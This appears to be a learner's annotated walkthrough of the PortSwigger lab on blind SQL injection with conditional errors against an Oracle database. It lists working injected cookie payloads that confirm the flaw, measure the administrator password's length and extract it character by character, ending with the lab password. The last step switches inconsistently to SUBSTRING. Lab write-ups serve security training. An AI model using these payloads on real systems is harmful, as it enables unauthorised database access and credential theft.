--Name: Blind SQL injection with conditional errors
--URL: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
--Level: Medium Time: 30 min
---------------------------------------------------------------------------------

-- Objective: log in as the administrator user.

-- Cookie name: TrackingId
-- Cookie value: odUcNsA2mSR7MSbs
-- Database type : Oracle
-- table name: users
-- columns name: username, password
-- username: administrator


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND '1'='1    '???--             Good
SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND TO_CHAR(1/0)='1    '???--    Error

SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT 'a' FROM dual)='a   '???--                Good 
SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT 'a' FROM not-a-real-table)='a   '???--    Error
-- meaning -- 
-- Now we know that there is a potential for an SQL injection here.
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a   '???--   Error
SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a   '???--   Good
-- meaning --
-- Now we know taht we can use a CASE statement to control an error. aka (Blind SQL injection with conditional errors)
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users)='  '???--    Good 
-- meaning --
-- replaced the 'a' with '' (empty string) because Oracle DB don't allow outputing astrings from a normal table it should be only from dual.
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator')<>'a  '???--   
-- meaning --
-- Now our statment is setup to start checking for condetions instead of (1=2).
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'z') THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator')<>'a  '???--    
-- meaning --
-- CHecking for the first letter of the password there.
-- THis statment is what we will use to get all the letters later.
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT CASE WHEN (LENGTH(password) > 19) THEN TO_CHAR(1/0) ELSE password END FROM users WHERE username='administrator')<>'a  '???--  
-- meaning --
-- Checking the password length.
-- keep addding to the nubmber until the indecation stop working.
-- that number will be your password leangth.
-- the password is 20 letter. (bigge rthan 19 but not bigger than 20)
--------------------------


SELECT ???? FROM ???? WHERE TrackingId = 'odUcNsA2mSR7MSbs' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a    '???-- 
-- Now we use our checking statment to get the all the letters of the password one by one.
--------------------------


-- password is: g9oqiaihptsiwojyw007